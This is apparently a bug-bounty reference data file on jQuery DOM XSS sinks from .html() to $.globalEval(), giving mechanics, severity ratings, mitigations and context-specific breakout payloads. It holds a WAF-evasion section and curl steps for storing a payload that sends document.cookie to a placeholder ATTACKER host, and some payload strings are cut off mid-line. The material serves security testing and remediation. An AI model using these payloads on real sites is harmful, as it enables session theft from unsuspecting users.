sinks.name: .html()
sinks.severity_note: P2 as DOM XSS when attacker data reaches the argument; drops to P4/self-XSS if the only path requires the victim pasting payload into their own console or DevTools.
sinks.explain: jQuery's .html(string) setter replaces the innerHTML of every matched element with the supplied string. Unlike raw innerHTML assignment, jQuery routes the string through its domManip pipeline, which parses the markup and additionally extracts inline <script> blocks and executes them via $.globalEval/DOMEval.
sinks.how_it_works: jQuery converts the string to DOM nodes (via buildFragment/createElement), inserts them, and then walks the inserted nodes for script elements: inline scripts are evaluated in global scope, external script srcs are fetched and executed. That means '' passed to .html() fires, whereas the same string assigned to element.innerHTML would not execute the script. Event-handler attributes (onerror, onload, onfocus...) execute regardless of jQuery version. Real-world history: jQuery < 1.6.3 treated $(location.hash) values like '#' as HTML rather than a selector (selector-injection XSS via hash); jQuery < 3.5.0 had htmlPrefilter self-closing-tag expansion bugs (CVE-2020-11022/11023) where crafted strings such as '
sinks.why_it_matters: .html() is the single most common jQuery sink in legacy apps, CMS themes, and admin panels. Any user-controlled value flowing into it (hash routers, AJAX JSON, search-reflection) is a direct DOM XSS, and jQuery's script-execution behavior means even payload filters that only block event handlers can be bypassed with plain <script> tags.

contexts.attr:
If the sink string is concatenated into markup that lands inside an attribute (e.g. '

sinks.waf_notes: Fragment-based payloads (#...) never reach the server, so server-side WAFs are blind to hash-router variants. Server-side filters often strip on* attributes and <script> but miss <svg onload>, malformed-tag tricks, or jQuery-specific htmlPrefilter edge cases on jQuery < 3.5.0. URL-encoding the payload defeats naive regexes; the browser decodes before jQuery sees it.
sinks.eligibility: DOM XSS into .html() is accepted on all major bug-bounty platforms. Check the jQuery version (jQuery.fn.jquery in console): <1.6.3 adds $(location.hash) selector injection, <3.5.0 adds CVE-2020-11022/11023 bypass material - both raise acceptance odds on legacy apps.
mitigations: Never pass untrusted strings to .html(); use .text() for plain text.
Sanitize with DOMPurify before calling .html(): $(el).html(DOMPurify.sanitize(data)).
Upgrade jQuery to >= 3.5.0 to close htmlPrefilter CVEs and >= 1.6.3 (ideally latest) for selector-injection fixes.
Deploy a strict Content-Security-Policy with a nonce so injected inline scripts and handlers cannot execute.
references: OWASP WSTG: Testing for Client-side URL Redirect and DOM-based Vulnerabilities

sinks.name: .append()
sinks.severity_note: P2 as DOM XSS; same impact as .html() but inserts at the end of the element instead of replacing its content.
sinks.explain: .append(content) inserts the supplied HTML string as the last child of every matched element. The string goes through jQuery's domManip pipeline, so inline <script> blocks inside it are extracted and executed globally, and event-handler attributes fire normally.
sinks.how_it_works: Because .append() adds nodes without wiping existing content, it is the typical sink for 'load more', chat-message, and notification renderers - exactly the places where server- or socket-delivered user data is appended in a loop. jQuery parses the string with buildFragment; scripts found in the fragment are run via DOMEval ($.globalEval) after insertion, so '<script>...</script>' payloads execute even though the same string through element.innerHTML would be inert.
sinks.why_it_matters: Append-style renderers usually process repeated attacker-supplied items (chat lines, search results, comments), which turns a single injection into stored or persistent DOM XSS hitting every viewer of the page.

contexts.html-body: Inserted as element content: all markup vectors work, and inline <script> executes via jQuery's script extraction.
contexts.attr: If concatenated inside an attribute of the appended markup, break out with '"><svg onload=alert(document.domain)>'.
contexts.js-string: When the value is embedded into a JS string before append, close the string and the script tag: ''.

sinks.waf_notes: Payloads arriving via websocket, postMessage, or fetch responses bypass perimeter WAFs entirely because they never appear in an HTTP request body that the WAF inspects. Server-side output filters on the API usually only cover the first render, not data appended later.
sinks.eligibility: DOM/stored XSS through .append() is accepted on all major platforms. Self-append (payload only renderable to the same account that created it, no other viewer) is self-XSS and usually NOT eligible - always demonstrate cross-user delivery.
mitigations: Build nodes with document.createElement and .textContent instead of HTML strings.
Sanitize dynamic fragments with DOMPurify before .append().
Keep jQuery >= 3.5.0 and enforce a nonce-based CSP.
references: OWASP: DOM based XSS Prevention Cheat Sheet

sinks.name: .prepend()
sinks.severity_note: P2 as DOM XSS; identical mechanics to .append() but inserts as the first child, which matters for above-the-fold auto-executing payloads.
sinks.explain: .prepend(content) inserts the supplied HTML string as the first child of every matched element. It shares jQuery's domManip pipeline with .append()/.html(), so inline scripts are extracted and executed globally and event handlers fire.
sinks.how_it_works: Prepend is common in live feeds and notification lists where the newest attacker-controlled item lands at the top. Because the payload renders immediately on insertion (no scrolling or interaction), auto-triggering vectors like fire instantly in every viewing session. jQuery executes
sinks.why_it_matters: Feed/notification prependers multiply impact: one injected item executes in the browser of every user who has the feed open, making this a reliable stored-XSS delivery sink.

mitigations: Use .text() / textContent for untrusted values; build nodes programmatically.

references: OWASP: DOM based XSS Prevention Cheat Sheet

sinks.name: .before()
sinks.severity_note: P2 as DOM XSS; insertion happens as a sibling OUTSIDE the target element, which can bypass containers that would neutralize inner content.
sinks.explain: .before(content) inserts the supplied HTML string as the preceding sibling of every matched element. Because the payload lands outside the target element, it escapes contexts where the element itself would constrain inner content (e.g. a target inside a disabled form, a <template>, or a filtered container). jQuery's domManip still extracts and executes inline scripts.
sinks.how_it_works: jQuery builds a fragment from the string and calls insertBefore on the target's parent. The key payload-delivery difference from .html()/.append() is placement: the injected nodes are siblings, not children. If the target element is a <script>, <style>, hidden input, or an element whose innerHTML is never rendered, .before() still renders the payload next to it in the visible DOM. Inline <script> in the fragment executes via DOMEval; event attributes fire on render.
sinks.why_it_matters: Sibling insertion lets attackers inject content adjacent to sensitive elements (login forms, CSRF-token inputs) for UI redress and credential phishing in addition to direct script execution, and it sidesteps naive defenses that only sanitize what goes 'inside' an element.

contexts.html-body: Sibling of the target: full markup vectors work, scripts execute via jQuery extraction; payload renders even if the target element itself is invisible or non-rendering.
contexts.attr: Break out with '"><svg onload=alert(document.domain)>' when the value lands inside an attribute of the sibling markup.
contexts.js-string: Use '' if the value passes through an inline script string first.

sinks.waf_notes: Query-string payloads may be inspected by a server WAF - switch to location.hash or POST-delivered data to stay off the wire. Filters anchored on element-content sanitization miss sibling placement.
sinks.eligibility: DOM XSS, accepted on all major platforms with a no-interaction trigger. Same form-submission-only reflections may be downgraded unless chained to a deliverable link.
mitigations: Insert text with .before(document.createTextNode(v)) or restructure to use .text().
Sanitize any HTML string with DOMPurify before insertion.
Nonce-based CSP to neutralize injected handlers and scripts.
references: OWASP WSTG: Testing for DOM-based Cross Site Scripting

sinks.name: .after()
sinks.severity_note: P2 as DOM XSS; mirrors .before() with following-sibling placement - payload escapes the target element's rendering context.
sinks.explain: .after(content) inserts the supplied HTML string as the following sibling of every matched element. Like .before(), the payload lands outside the target element, so it renders even when the target is invisible, non-rendering (<script>/<style>/<input>), or content-filtered. Inline scripts in the fragment execute via jQuery's DOMEval.
sinks.how_it_works: jQuery parses the string into a fragment and inserts it after the target in its parent. A common pattern is error/hint rendering: $(input).after(''+msg+'') - any attacker control of msg yields markup injection directly adjacent to form fields, ideal for both script execution and phishing overlays. Scripts in the inserted fragment run globally.
sinks.why_it_matters: After-insertion is pervasive in validation messages and dynamic UI hints, which are fed by server validation responses or reflected input - a direct pipeline from attacker data to executable DOM next to credential fields.

sinks.name: .replaceWith()
sinks.severity_note: P2 as DOM XSS; the target element is removed entirely, so the payload is not constrained by the target's context at all.
sinks.explain: .replaceWith(content) removes every matched element from the DOM and inserts the supplied HTML string in its place. The replacement goes through jQuery's fragment pipeline, so inline <script> executes and event attributes fire.
sinks.how_it_works: Because the original element is deleted, any scoping it provided disappears: a replacement targeting a <noscript>, a hidden container, or a sanitizer-wrapped node lets the payload land in a clean parent context. A common vulnerable pattern is SPA content swapping: $('#content').replaceWith(templateString) where templateString embeds attacker data. jQuery executes scripts found in the replacement fragment via DOMEval after insertion.
sinks.why_it_matters: Replacement sinks typically guard 'main content' regions of the page; injecting there means full-page UI takeover, plus reliable script execution in the most trusted visual area of the app.

sinks.name: .wrap()
sinks.severity_note: P3 because attacker markup wraps (surrounds) the target rather than replacing it - execution requires landing markup outside the wrapped element, e.g. by closing the wrapper early; still full XSS when that works.
sinks.explain: .wrap(html) wraps every matched element with the supplied HTML structure. The wrapping string is parsed as markup, so an attacker-controlled value injects nodes around the target element - useful for attribute injection on the wrapper and for UI-redress overlays, and escapable into full XSS by closing the wrapper structure.
sinks.how_it_works: jQuery clones the first element of the parsed wrapper and inserts the target inside its deepest child. If the attacker string contains more than a single wrapper (e.g. ''), the extra markup lands in the DOM as siblings during the manipulation and executes. Even without breakout, controlling the wrapper means injecting arbitrary attributes (style, class, formaction on a wrapping form) around sensitive elements like login forms.
sinks.why_it_matters: Wrap is common in theming/decorating code ($(el).wrap('<div class="'+theme+'">')) where a theme or layout value is user-influenced; it converts partial markup control into phishing-grade UI manipulation and, with breakout, script execution.

sinks.name: $.parseHTML()
sinks.severity_note: P2 when the parsed nodes are inserted into the document; the third argument keepScripts=true turns inline <script> into guaranteed execution on insertion (default false since jQuery 1.8 - scripts are stripped from the returned nodes, but event attributes always survive).
sinks.explain: $.parseHTML(htmlString [, context] [, keepScripts]) parses a string into an array of DOM nodes. Developers use it to 'sanitize' or pre-parse HTML before insertion; any attacker control of the string yields XSS once the returned nodes are appended to the document. Event-handler attributes (onerror, onload) are always preserved and execute on insertion regardless of keepScripts.
sinks.how_it_works: parseHTML uses the native parser (createElement + innerHTML under the hood, or context.createElement) to build nodes. The keepScripts flag only controls whether <script> elements are kept in the returned node array (they are executed later, at insertion time, by jQuery's domManip/DOMEval - not during parsing). A vulnerable call looks like: $('#out').append($.parseHTML(userHtml, document, true)). Even with keepScripts=false, '<svg onload=alert(1)>' in the string executes the moment the nodes enter the document, because attribute handlers are a native-DOM behavior jQuery cannot strip.
sinks.why_it_matters: parseHTML is frequently mistaken for a sanitizer and placed in exactly the code path meant to 'safely' render user HTML. Finding it in review is a strong lead: check the third argument, then check what happens to the returned nodes.

contexts.html-body: Parsed nodes inserted into the document: event attributes always fire; inline <script> fires only when keepScripts=true or when a later jQuery insertion executes kept scripts.
contexts.attr: If the parsed string is concatenated into an attribute elsewhere, break out with '">'.
contexts.js-string: Not applicable at parse time; watch for the parse result being stringified back with .innerHTML reads, which re-enters html-body context.

sinks.waf_notes: Payloads delivered via postMessage or API responses avoid request-side WAF inspection. Server filters stripping
sinks.eligibility: DOM/stored XSS, accepted on all major platforms. The keepScripts nuance is a severity detail, not a blocker: even the 'safe' default configuration is exploitable via event attributes, which strengthens acceptance.
mitigations: Do not use $.parseHTML as a sanitizer - it is a parser, not a filter.
Sanitize the string with DOMPurify first: $.parseHTML(DOMPurify.sanitize(s)).
Never pass keepScripts=true for untrusted input; enforce a nonce-based CSP.

sinks.name: $.globalEval()
sinks.severity_note: P2 direct JS execution in global scope when attacker data reaches the argument; P3 if the input is only indirectly influenced; requires CSP to allow 'unsafe-eval' (or no CSP) to fire.
sinks.explain: $.globalEval(code) executes a JavaScript string in the global scope (internally via window.execScript or an indirect window.eval call). Any attacker influence over the string is arbitrary JavaScript execution in the origin - equivalent to eval().
sinks.how_it_works: Unlike a direct eval inside a closure, globalEval deliberately escapes local scope: variables and functions it defines land on window, and it reads the global environment. It is also the engine behind jQuery's script execution for .html()/.append() (inline scripts extracted from inserted markup are passed to DOMEval/globalEval), so it appears both as an explicit sink in legacy code and implicitly wherever script-bearing HTML is inserted. Because it ultimately calls eval, a CSP without 'unsafe-eval' blocks it - check the page's CSP before claiming impact.
sinks.why_it_matters: Global-scope code execution means full origin compromise: cookieless session tokens in JS, CSRF-token reads, and arbitrary API calls as the victim. Explicit $.globalEval(userData) in code review is an immediate high-confidence finding.

steps.action: Confirm an API field is passed to $.globalEval (look for 'config', 'script', 'callback' style fields)
steps.command: curl -s -X POST 'https://TARGET/api/widget' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{"init":"window.jlfTrace=1"}' then load the widget page
steps.indicator: typing jlfTrace in DevTools console returns 1, proving the string executed globally

steps.action: Deliver the exfiltration payload
steps.command: curl -s -X POST 'https://TARGET/api/widget' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{"init":"fetch(\'https://ATTACKER/c?c=\'+document.cookie)"}'
steps.indicator: the ATTACKER listener receives cookies from every session that loads the widget

chains.eligibility: Stored JS execution, accepted on all major platforms; verify CSP allows unsafe-eval or is absent before finalizing the report.

steps.action: Confirm message data reaches $.globalEval
steps.command: in DevTools console on https://TARGET/page run: window.postMessage('window.jlfTrace=2','*')
steps.indicator: jlfTrace === 2 in the console afterwards

steps.action: Deliver from an attacker-controlled page
steps.command: host the iframe HTML on https://ATTACKER/poc.html and open it in a browser
steps.indicator: the cookie-bearing request arrives at the ATTACKER listener from the framed origin

chains.eligibility: Accepted when the listener's origin validation is missing or bypassable; blocked entirely if CSP forbids unsafe-eval - report the missing defense-in-depth accordingly.

contexts.html-body: Not a markup sink - payloads are JavaScript, not HTML.
contexts.js-string: If attacker data is concatenated into the evaluated string, inject JS directly: ';alert(document.domain)// or close a string: '-alert(document.domain)-'.

sinks.waf_notes: Delivery via fetch/XHR responses or postMessage is invisible to request-side WAFs. The real control is CSP: without 'unsafe-eval' the sink is dead - always fetch the CSP header (curl -sI) and quote it in the report.
sinks.eligibility: Arbitrary JS execution is accepted on all major platforms when CSP permits eval. If CSP blocks it, most programs treat the finding as informational/defense-in-depth unless you chain a CSP bypass.
mitigations: Never evaluate strings from any source; pass data as JSON and parse it.
Remove 'unsafe-eval' from CSP so globalEval and friends cannot execute.
Replace dynamic-code plugin patterns with declarative configuration.
references: OWASP WSTG: Testing for JavaScript Execution
